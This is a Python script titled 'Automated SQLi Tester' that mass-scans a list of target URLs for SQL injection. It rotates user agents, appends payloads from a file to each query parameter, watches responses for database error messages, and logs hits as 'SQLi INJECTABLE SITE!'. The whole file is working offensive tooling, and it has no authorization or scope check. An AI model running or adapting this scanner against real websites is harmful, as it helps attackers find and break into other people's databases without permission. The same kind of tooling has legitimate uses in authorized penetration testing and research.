import os
import asyncio
import logging
import httpx
import random
import time
from aiofiles import open as aio_open
from colorama import Fore, Style, init
from difflib import unified_diff
from datetime import datetime

# Initialize colorama for colored output
init(autoreset=True)

# Logging configuration
logging.basicConfig(
    filename="sqli_tester.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Directory for temporary storage
temp_dir = "temp_pages"

# Ensure clean temp directory
def setup_temp_directory():
    if os.path.exists(temp_dir):
        for file in os.listdir(temp_dir):
            os.remove(os.path.join(temp_dir, file))
    else:
        os.makedirs(temp_dir)

# Print Banner (ASCII Art Example)
def print_banner():
    banner = """
   _____  ____  _      _____  _                       
  / ____|/ __ \| |    |  __ \(_)                      
 | (___ | |  | | |    | |__) |_ _ __  _ __   ___ _ __ 
  \___ \| |  | | |    |  _  /| | '_ \| '_ \ / _ \ '__|
  ____) | |__| | |____| | \ \| | |_) | |_) |  __/ |   
 |_____/ \___\_\______|_|  \_\_| .__/| .__/ \___|_|   
                               | |   | |              
                               |_|   |_|              
    """
    print(Fore.MAGENTA + banner)

# Initial Loading Sequence
def initial_loading():
    print_banner()
    print(Fore.YELLOW + "Automated SQLi Tester")
    print(Fore.GREEN + "Developed by: Z3r0 S3c")

    # Count URLs in Targets.txt
    try:
        with open("Targets.txt", "r") as file:
            urls = [line.strip() for line in file if line.strip()]
            num_targets = len(urls)
    except FileNotFoundError:
        print(Fore.RED + "Error: 'Targets.txt' not found. Please add your targets and try again.")
        return None

    print(Fore.BLUE + f"Locking onto {num_targets} to Investigate")
    return urls

# Function to read user-agents from file
def load_user_agents():
    try:
        with open("user-agents.txt", "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "Error: 'user-agents.txt' not found. Please add your user agents and try again.")
        return []

# Asynchronous page downloader with redirect handling
async def download_page_async(url, user_agents):
    async with httpx.AsyncClient(timeout=10, headers={"User-Agent": random.choice(user_agents)}) as client:
        try:
            response = await client.get(url, follow_redirects=True)
            if response.status_code == 200:
                return response.text, response.status_code
            else:
                logging.warning(Fore.YELLOW + f"Non-200 status code for {url}: {response.status_code}")
                return None, response.status_code
        except httpx.HTTPStatusError as e:
            logging.error(Fore.RED + f"HTTP error for {url}: {e}")
            return None, e.response.status_code if e.response else 500
        except httpx.RequestError as e:
            logging.error(Fore.RED + f"Request error for {url}: {e}")
            return None, 500

# Inject SQL payloads into URL
async def inject_payloads_async(url, payloads, user_agents):
    results = []
    params_start = url.find('?')
    if params_start == -1:
        logging.warning(Fore.YELLOW + f"URL has no query parameters: {url}")
        return results

    base_url = url[:params_start]
    params = url[params_start + 1:].split('&')

    for i, param in enumerate(params):
        try:
            key, value = param.split('=')
        except ValueError:
            logging.warning(Fore.YELLOW + f"Skipping malformed parameter in URL: {param}")
            continue

        for payload in payloads:
            injected_params = params[:]
            injected_params[i] = f"{key}={value}{payload}"
            injected_url = f"{base_url}?{'&'.join(injected_params)}"

            original_content, original_status = await download_page_async(url, user_agents)
            injected_content, injected_status = await download_page_async(injected_url, user_agents)

            if not original_content or not injected_content:
                continue

            # Check for potential SQLi errors and status codes
            if any(err in injected_content for err in ["SQL syntax", "MySQL error", "SQLSTATE", "error in your SQL syntax", "PostgreSQL error"]):
                logging.info(f"SQLi detected: {injected_url}")
                results.append((url, injected_url, injected_content))

            # Handle non-200 status codes
            if injected_status != 200:
                logging.info(f"Non-200 response detected for {injected_url}: {injected_status}")
                results.append((url, injected_url, injected_content))

    return results

# Process all URLs asynchronously
async def process_urls_async(urls, payloads, user_agents):
    tasks = [test_url_async(url, payloads, user_agents) for url in urls]
    await asyncio.gather(*tasks)

# Test individual URL
async def test_url_async(url, payloads, user_agents):
    print(Fore.CYAN + f"Testing URL: {url}")
    results = await inject_payloads_async(url, payloads, user_agents)
    if results:
        for original_url, injected_url, response in results:
            async with aio_open("success.txt", "a") as success_log:
                await success_log.write(f"SQLi INJECTABLE SITE!\n")
                await success_log.write(f"Original URL: {original_url}\n")
                await success_log.write(f"Injected URL: {injected_url}\n")
                await success_log.write(f"Response:\n{response}\n\n")

# Main function with asyncio
async def main_async():
    setup_temp_directory()
    urls = initial_loading()
    if not urls:
        return

    try:
        with open("SQLPayloads.txt", "r") as file:
            payloads = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "Error: 'SQLPayloads.txt' not found. Please add your payloads and try again.")
        return

    user_agents = load_user_agents()
    if not user_agents:
        print(Fore.RED + "Error: 'user-agents.txt' not found or empty. Please add user agents and try again.")
        return

    await process_urls_async(urls, payloads, user_agents)

if __name__ == "__main__":
    asyncio.run(main_async())
